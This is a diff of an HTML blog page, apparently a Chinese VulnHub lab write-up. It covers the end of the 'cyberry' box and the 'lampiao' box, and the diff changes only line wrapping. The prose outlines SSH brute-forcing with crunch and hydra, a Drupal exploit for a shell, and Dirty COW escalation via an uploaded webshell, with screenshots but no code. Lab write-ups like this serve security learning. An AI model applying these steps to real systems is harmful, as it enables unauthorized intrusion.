class="line"></span><br><span class="line">Nick</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string(0) &quot;&quot;</span><br><span class="line">halle@cyberry:~$ </span><br></pre></td></tr></table></figure>
-<p>用crunch去生成密码,然后用hydra去爆 <img src="/images/2018/09/2018-09-15-19-02-16屏幕截图.png" alt="blacsheep" /> ssh连上去,发现是root <img src="/images/2018/09/2018-09-15-19-05-06屏幕截图.png" alt="blacsheep" /></p>
+<p>用crunch去生成密码,然后用hydra去爆 <img
+src="/images/2018/09/2018-09-15-19-02-16屏幕截图.png" alt="blacsheep" />
+ssh连上去,发现是root <img
+src="/images/2018/09/2018-09-15-19-05-06屏幕截图.png"
+alt="blacsheep" /></p>
 <h2 id="后续">后续</h2>
 <p>后来发现还有一个提权方法,terry用户可以执行nick目录下面的makeberry二进制文件,而这里有一个栈溢出,可以交给二进制手子来做..</p>
 <h1 id="lampiao">lampiao</h1>
 <p>非常简单..</p>
 <h2 id="介绍-1">介绍</h2>
-<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/" title="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/"
+title="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p>
 <h2 id="找ip扫端口">找ip,扫端口</h2>
-<p>靶机ip:192.168.31.113 <img src="/images/2018/09/2018-09-16-01-48-59屏幕截图.png" alt="blacsheep" /></p>
+<p>靶机ip:192.168.31.113 <img
+src="/images/2018/09/2018-09-16-01-48-59屏幕截图.png"
+alt="blacsheep" /></p>
 <h2 id="拿shell">拿shell</h2>
-<p>去1898看下,发现是drupal <img src="/images/2018/09/2018-09-16-01-56-41屏幕截图.png" alt="blacsheep" /> 直接用drupal的exp打一下 <img src="/images/2018/09/2018-09-16-01-50-39屏幕截图.png" alt="blacsheep" /> 然后拿到shell <img src="/images/2018/09/2018-09-16-01-51-28屏幕截图.png" alt="blacsheep" /></p>
+<p>去1898看下,发现是drupal <img
+src="/images/2018/09/2018-09-16-01-56-41屏幕截图.png" alt="blacsheep" />
+直接用drupal的exp打一下 <img
+src="/images/2018/09/2018-09-16-01-50-39屏幕截图.png" alt="blacsheep" />
+然后拿到shell <img src="/images/2018/09/2018-09-16-01-51-28屏幕截图.png"
+alt="blacsheep" /></p>
 <h2 id="提权-1">提权</h2>
-<p>用一下探测脚本,然后这里选择脏牛 <img src="/images/2018/09/2018-09-16-01-55-42屏幕截图.png" alt="blacsheep" /> 写一个webshell然后传exp上去,执行一下 <img src="/images/2018/09/2018-09-16-02-08-53屏幕截图.png" alt="blacsheep" /></p>
+<p>用一下探测脚本,然后这里选择脏牛 <img
+src="/images/2018/09/2018-09-16-01-55-42屏幕截图.png" alt="blacsheep" />
+写一个webshell然后传exp上去,执行一下 <img
+src="/images/2018/09/2018-09-16-02-08-53屏幕截图.png"
+alt="blacsheep" /></p>
 
   </div>
 </article>
